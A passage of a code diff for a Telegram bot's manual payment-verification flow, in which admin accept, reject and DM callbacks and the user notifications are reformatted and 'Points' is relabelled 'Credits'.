+            '✅ <b>Payment Accepted!</b>\n\n' +
+            '👤 User: <code>' + userId + '</code>\n' +
+            '📊 Credits: ' + payment.credits + '\n' +
+            '💵 Amount: ₹' + payment.amount + '\n\n' +
+            '✅ Credits added successfully!',
+            { chat_id: cid, message_id: mid, parse_mode: 'HTML' }
+        );
+
+        await S7.answerCallbackQuery(q.id, { text: '✅ Payment accepted! Credits added.' });
         logToFile('💰 Admin accepted payment from ' + userId);
         return;
     }
+
     if (q.data.startsWith('pay_reject_') && isAdmin) {
         const userId = q.data.replace('pay_reject_', '');
         const user = await getUser(userId);
         const payment = user._pendingPayment || { credits: 'Unknown', amount: 'Unknown' };
-        await S7.sendMessage(userId, '❌ <b>Payment Rejected!</b>\n\n📊 Points: ' + payment.credits + '\n💵 Amount: ₹' + payment.amount + '\n\nReason: Payment verification failed.\nPlease try again with a valid screenshot.', { parse_mode: 'HTML' });
+        await S7.sendMessage(userId,
+            '❌ <b>Payment Rejected!</b>\n\n' +
+            '📊 Credits: ' + payment.credits + '\n' +
+            '💵 Amount: ₹' + payment.amount + '\n\n' +
+            'Reason: Payment verification failed.\n' +
+            'Please try again with a valid screenshot.',
+            { parse_mode: 'HTML' }
+        );
         user._pendingPayment = null;
         await user.save();
-        await S7.editMessageText('❌ <b>Payment Rejected!</b>\n\n👤 User: <code>' + userId + '</code>\n📊 Credits: ' + payment.credits + '\n💵 Amount: ₹' + payment.amount + '\n\n❌ User notified.', { chat_id: cid, message_id: mid, parse_mode: 'HTML' });
+
+        await S7.editMessageText(
+            '❌ <b>Payment Rejected!</b>\n\n' +
+            '👤 User: <code>' + userId + '</code>\n' +
+            '📊 Credits: ' + payment.credits + '\n' +
+            '💵 Amount: ₹' + payment.amount + '\n\n' +
+            '❌ User notified.',
+            { chat_id: cid, message_id: mid, parse_mode: 'HTML' }
+        );
+
         await S7.answerCallbackQuery(q.id, { text: '❌ Payment rejected.' });
         logToFile('💰 Admin rejected payment from ' + userId);
         return;
     }
+
     if (q.data.startsWith('pay_dm_') && isAdmin) {
         const userId = q.data.replace('pay_dm_', '');
-        await S7.sendMessage(cid, '💬 <b>Send message to user</b>\n\nReply with: <code>/dm ' + userId + ' [message]</code>\n\nExample: <code>/dm ' + userId + ' Please send a clearer screenshot.</code>', { parse_mode: 'HTML' });
+        await S7.sendMessage(cid,
+            '💬 <b>Send message to user</b>\n\n' +
+            'Reply with: <code>/dm ' + userId + ' [message]</code>\n\n' +
+            'Example: <code>/dm ' + userId + ' Please send a clearer screenshot.</code>',
+            { parse_mode: 'HTML' }
+        );
         await S7.answerCallbackQuery(q.id, { text: '💬 Type /dm ' + userId + ' [message]' });
         await S7.deleteMessage(cid, mid);
         return;
@@ -1503,10 +1551,10 @@ S7.on('message', async (msg) => {
     if (!user._pendingPayment) return;
     const payment = user._pendingPayment;
     const fileId = msg.photo[msg.photo.length - 1].file_id;
-    const adminMsg = '💰 <b>New Payment Request</b>\n\n👤 <b>User:</b> @' + (msg.from.username || 'user_' + msg.from.id) + '\n🆔 <b>User ID:</b> <code>' + msg.from.id + '</code>\n📊 <b>Points:</b> ' + payment.credits + '\n💵 <b>Amount:</b> ₹' + payment.amount + '\n📅 <b>Time:</b> ' + new Date().toLocaleString() + '\n\n📸 <b>Screenshot:</b> (below)';
+    const adminMsg = '💰 <b>New Payment Request</b>\n\n👤 <b>User:</b> @' + (msg.from.username || 'user_' + msg.from.id) + '\n🆔 <b>User ID:</b> <code>' + msg.from.id + '</code>\n📊 <b>Credits:</b> ' + payment.credits + '\n💵 <b>Amount:</b> ₹' + payment.amount + '\n📅 <b>Time:</b> ' + new Date().toLocaleString() + '\n\n📸 <b>Screenshot:</b> (below)';
     const adminButtons = { inline_keyboard: [[{ text: '✅ ACCEPT', callback_data: 'pay_accept_' + msg.from.id }], [{ text: '❌ REJECT', callback_data: 'pay_reject_' + msg.from.id }], [{ text: '💬 DM USER', callback_data: 'pay_dm_' + msg.from.id }]] };
     await S7.sendPhoto(config.adminId, fileId, { caption: adminMsg, parse_mode: 'HTML', reply_markup: adminButtons });
-    await S7.sendMessage(msg.from.id, '✅ <b>Payment screenshot received!</b>\n\n📊 Points: ' + payment.credits + '\n💵 Amount: ₹' + payment.amount + '\n\n⏳ Please wait for admin to verify your payment.\nYou will be notified once approved.', { parse_mode: 'HTML' });
+    await S7.sendMessage(msg.from.id, '✅ <b>Payment screenshot received!</b>\n\n📊 Credits: ' + payment.credits + '\n💵 Amount: ₹' + payment.amount + '\n\n⏳ Please wait for admin to verify your payment.\nYou will be notified once approved.', { parse_mode: 'HTML' });
     logToFile('💰 Payment screenshot from ' + msg.from.id + ' - ₹' + payment.amount);
     user._pendingPayment = null;
     await user.save();
